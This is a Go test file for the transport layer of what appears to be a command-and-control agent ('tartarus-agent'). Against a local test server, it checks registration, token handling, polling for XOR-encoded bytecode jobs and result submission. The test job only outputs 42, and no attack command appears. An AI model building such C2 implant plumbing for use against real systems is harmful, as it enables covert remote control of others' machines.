package transport

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"

	"tartarus-agent/config"
)

// buildIR produces PUSH 42 ; OUTPUT ; RET in the compiler's encoding.
func buildIR() []byte {
	key := byte(0x33)
	push := func(raw []byte) []byte {
		out := []byte{0x07, byte(len(raw)), key}
		for _, b := range raw {
			out = append(out, b^key)
		}
		return out
	}
	op := func(op byte, raw []byte) []byte {
		out := []byte{op, byte(len(raw)), key}
		for _, b := range raw {
			out = append(out, b^key)
		}
		return out
	}
	raw := make([]byte, 10)
	raw[0] = 1
	raw[1] = 8
	raw[2] = 0
	raw[3] = 0
	raw[4] = 0
	raw[5] = 0
	raw[6] = 0
	raw[7] = 0
	raw[8] = 0
	raw[9] = 42
	ir := push(raw)
	ir = append(ir, op(0x14, nil)...) // OUTPUT
	ir = append(ir, 0x06)             // RET
	return ir
}

func TestPollOnceEndToEnd(t *testing.T) {
	var mu sync.Mutex
	var submitted map[string]string = map[string]string{}

	mux := http.NewServeMux()
	mux.HandleFunc("/agents/register", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]any{
			"message":     "ok",
			"agent_token": "test-token",
		})
	})
	mux.HandleFunc("/jobs/pending/agent-1", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer test-token" {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		json.NewEncoder(w).Encode(map[string]any{
			"job_id":    "job-1",
			"exec_mode": "user_mode",
			"ir":        buildIR(),
		})
	})
	mux.HandleFunc("/results/submit", func(w http.ResponseWriter, r *http.Request) {
		var body map[string]any
		json.NewDecoder(r.Body).Decode(&body)
		mu.Lock()
		submitted[fmt.Sprint(body["job_id"])] = fmt.Sprint(body["message"])
		mu.Unlock()
		json.NewEncoder(w).Encode(map[string]any{"message": "Result received"})
	})

	srv := httptest.NewServer(mux)
	defer srv.Close()

	client := NewClient(config.AgentConfig{
		AgentID:   "agent-1",
		C2BaseURL: srv.URL,
		PollMin:   1,
		PollMax:   2,
	})

	if err := client.Register(); err != nil {
		t.Fatalf("register: %v", err)
	}
	if client.Tok != "test-token" {
		t.Fatalf("token not stored: %q", client.Tok)
	}

	worked, err := client.PollOnce()
	if err != nil {
		t.Fatalf("poll: %v", err)
	}
	if !worked {
		t.Fatal("expected a job to be claimed")
	}

	mu.Lock()
	defer mu.Unlock()
	msg, ok := submitted["job-1"]
	if !ok {
		t.Fatal("no result submitted")
	}
	var result map[string]any
	if err := json.Unmarshal([]byte(msg), &result); err != nil {
		t.Fatalf("result not JSON: %v (%s)", err, msg)
	}
	if outs, ok := result["outputs"].([]any); !ok || len(outs) != 1 || outs[0] != float64(42) {
		t.Fatalf("expected outputs [42], got %#v", result["outputs"])
	}
}

func TestPollIdle(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/jobs/pending/agent-1", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	client := NewClient(config.AgentConfig{AgentID: "agent-1", C2BaseURL: srv.URL})
	worked, err := client.PollOnce()
	if err != nil {
		t.Fatalf("poll: %v", err)
	}
	if worked {
		t.Fatal("expected idle poll")
	}
}
